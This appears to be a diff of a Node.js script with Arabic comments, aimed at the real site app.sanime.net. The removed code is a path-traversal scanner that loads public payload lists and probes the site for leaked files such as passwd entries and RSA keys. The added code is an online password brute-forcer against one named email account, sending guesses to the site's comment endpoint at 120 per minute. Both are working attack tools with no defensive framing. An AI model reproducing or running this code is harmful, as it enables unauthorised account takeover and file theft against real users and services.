@@ -1,121 +1,150 @@
-const axios = require('axios');
-const express = require('express');
-const http = require('http');
-const https = require('https');
-
+const axios = require("axios");
+const https = require("https");
+const express = require("express");
+const fetch = require("node-fetch");
 const app = express();
-const port = process.env.PORT || 10000;
+app.use(express.urlencoded({ extended: true }));
 
-const agent = {
-  http: new http.Agent({ keepAlive: true, maxSockets: 100 }),
-  https: new https.Agent({ keepAlive: true, maxSockets: 100 })
-};
+let email = "noon1412123@gmail.com";
+let commentText = "TTTT";
+let commentsPerMinute = 120;
+let delay = (60 / commentsPerMinute) * 1000;
 
-const axiosInstance = axios.create({
-  httpAgent: agent.http,
-  httpsAgent: agent.https,
-  timeout: 5000
-});
+let logText = "";
+let botActive = true;
+let intervalId = null;
 
-const payloadSources = [
-  'https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Directory%20Traversal/Intruder/deep_traversal.txt',
-  'https://raw.githubusercontent.com/Bo0oM/Path-Traversal-Wordlist/master/path_traversal.txt',
-  'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-Jhaddix.txt'
-];
+const animeId = 532;
+const animeName = "One Piece";
 
-const basePaths = [
-  "https://app.sanime.net/api/",
-  "https://app.sanime.net/api/anime/11751/",
-  "https://app.sanime.net/file/",
-  "https://app.sanime.net/assets/",
-  "https://app.sanime.net/public/",
-  "https://app.sanime.net/storage/"
-];
+// كلمات يدوية أولًا (أي طول)
+const manualPasswords = ["admin123", "mypassword", "googoog"];
+let manualIndex = 0;
+let tryingManual = true;
 
-const sensitiveIndicators = [
-  'root:x', 'DB_HOST', '<?php', '[mysqld]', 'password', 'authorization', 'BEGIN RSA'
-];
+let foundPassword = null;
+let currentPassword = "";
 
-let foundLeaks = [];
-let isScanning = true;
-let currentProgress = "🔃 يتم تحميل payloads...";
+// توليد كلمات مرور 8 حروف صغيرة + 0–3 أرقام
+function generatePassword() {
+  const letters = "abcdefghijklmnopqrstuvwxyz";
+  const digits = "0123456789";
+  let pwd = "";
+  const digitCount = Math.floor(Math.random() * 4);
+  const lettersCount = 8 - digitCount;
 
-// واجهة عرض النتائج
-app.get('/', (req, res) => {
-  res.send(`
-    <html><head><meta charset="utf-8"><title>Path Traversal Scanner</title>
-    <meta http-equiv="refresh" content="10">
-    <style>body{background:#111;color:#0f0;font-family:monospace;padding:20px}a{color:#0ff}</style>
-    </head><body>
-      <h1>📡 فحص الثغرات</h1>
-      ${isScanning ? `<p>🔄 ${currentProgress}</p>` : foundLeaks.length > 0
-        ? `<h2>🚨 تم العثور على تسريبات:</h2><ul>${foundLeaks.map(url => `<li><a href="${url}" target="_blank">${url}</a></li>`).join('')}</ul>`
-        : `<h2>✅ لا توجد تسريبات</h2>`}
-    </body></html>
-  `);
-});
-
-// نقطة keep-alive
-app.get('/ping', (req, res) => {
-  res.send('✅ ALIVE');
-});
-
-async function fetchPayloads() {
-  const all = new Set();
-  for (const url of payloadSources) {
-    try {
-      const res = await axios.get(url);
-      res.data.split('\n').forEach(line => {
-        if (line.trim()) all.add(line.trim());
-      });
-    } catch (err) {
-      console.log(`⚠️ فشل تحميل ${url}`);
-    }
-  }
-  return Array.from(all);
-}
-
-async function scan() {
-  const payloads = await fetchPayloads();
-  console.log(`📦 Loaded ${payloads.length} payloads`);
-  const batchSize = 100;
-
-  for (const base of basePaths) {
-    console.log(`🚀 فحص: ${base}`);
-    for (let i = 0; i < payloads.length; i += batchSize) {
-      const batch = payloads.slice(i, i + batchSize);
-      currentProgress = `🔎 فحص ${i + 1} إلى ${i + batch.length} من ${payloads.length} على ${base}`;
-
-      await Promise.allSettled(batch.map(async payload => {
-        const url = base + encodeURIComponent(payload);
-        try {
-          const res = await axiosInstance.get(url);
-          const body = res.data.toString();
-          if (sensitiveIndicators.some(ind => body.includes(ind))) {
-            console.log(`🚨 Leak Detected: ${url}`);
-            foundLeaks.push(url);
-          }
-        } catch (_) {}
-      }));
-
-      await new Promise(resolve => setTimeout(resolve, 100)); // delay بسيط لتفادي 502
-    }
+  for (let i = 0; i < lettersCount; i++) {
+    pwd += letters.charAt(Math.floor(Math.random() * letters.length));
   }
 
-  isScanning = false;
-  currentProgress = '✅ فحص مكتمل';
-  console.log('✅ انتهى الفحص.');
+  for (let i = 0; i < digitCount; i++) {
+    const pos = Math.floor(Math.random() * pwd.length);
+    pwd =
+      pwd.slice(0, pos) +
+      digits.charAt(Math.floor(Math.random() * digits.length)) +
+      pwd.slice(pos);
+  }
+
+  return pwd;
 }
 
-// تشغيل السيرفر والفحص + إضافة keep-alive داخلي
-app.listen(port, () => {
-  console.log(`🟢 السيرفر يعمل على المنفذ ${port}`);
-  scan();
+async function sendComment(pwd) {
+  const itemData = { post: commentText, id: animeId, fire: true };
+  const itemBase64 = Buffer.from(JSON.stringify(itemData)).toString("base64");
+  const payload = new URLSearchParams({
+    email,
+    password: pwd,
+    item: itemBase64
+  });
 
-  // 🔁 keep-alive داخلي لحماية الخدمة من الإيقاف
-  setInterval(() => {
-    axios.get('https://soos.onrender.com/ping')
-      .then(() => console.log('💓 Keep-alive ping sent'))
-      .catch(() => console.log('⚠️ Failed keep-alive ping'));
-  }, 4 * 60 * 1000); // كل 4 دقائق
+  try {
+    const res = await axios.post(
+      "https://app.sanime.net/function/h10.php?page=addcmd",
+      payload.toString(),
+      {
+        headers: {
+          "User-Agent": "Mozilla/5.0",
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        httpsAgent: new https.Agent({ keepAlive: true }),
+        timeout: 8000,
+        validateStatus: () => true
+      }
+    );
+    return { status: res.status, data: res.data };
+  } catch (err) {
+    console.error("⚠️ خطأ شبكة أو مهلة:", err.message);
+    return { status: null, data: null };
+  }
+}
+
+async function attemptPassword(pwd) {
+  while (true) {
+    const res = await sendComment(pwd);
+
+    if (res.status === 502 || res.status === 504 || res.status === null) {
+      console.log(`⚠️ خطأ ${res.status} – إعادة ${pwd}`);
+      continue;
+    }
+
+    if (typeof res.data === "string" && !res.data.includes("login failed")) {
+      foundPassword = pwd;
+      console.log(`✅ تم العثور على الباسورد الصحيح: ${pwd}`);
+      return true;
+    } else {
+      console.log(`❌ تجربة: ${pwd}`);
+      return false;
+    }
+  }
+}
+
+function startBrute() {
+  intervalId = setInterval(async () => {
+    if (!botActive || foundPassword) {
+      clearInterval(intervalId);
+      return;
+    }
+
+    if (tryingManual && manualIndex < manualPasswords.length) {
+      currentPassword = manualPasswords[manualIndex++];
+    } else {
+      tryingManual = false;
+      currentPassword = generatePassword();
+    }
+
+    await attemptPassword(currentPassword);
+  }, delay);
+}
+
+// ✅ صفحة الواجهة
+app.get("/", (req, res) => {
+  if (foundPassword) {
+    res.send(
+      `<h1 style="color:lime">✅ الباسورد الصحيح: <b>${foundPassword}</b></h1>`
+    );
+  } else if (!tryingManual) {
+    res.send(
+      `<h1 style="color:red">❌ انتهت المحاولات دون إيجاد الباسورد الصحيح.</h1>`
+    );
+  } else {
+    res.send(
+      `<h1>🔄 جاري التجربة...<br>الباسورد الحالي: <code>${currentPassword}</code></h1>`
+    );
+  }
+});
+
+// ✅ خدمة keep-alive
+setInterval(async () => {
+  try {
+    await fetch("https://soos.onrender.com/");
+    console.log("🔁 ping render");
+  } catch (e) {
+    console.log("❌ فشل ping");
+  }
+}, 60000); // كل دقيقة
+
+// ✅ بدء السيرفر
+app.listen(process.env.PORT || 10000, () => {
+  console.log("🚀 بدأ السيرفر وجاري تجربة الباسوردات");
+  startBrute();
 });
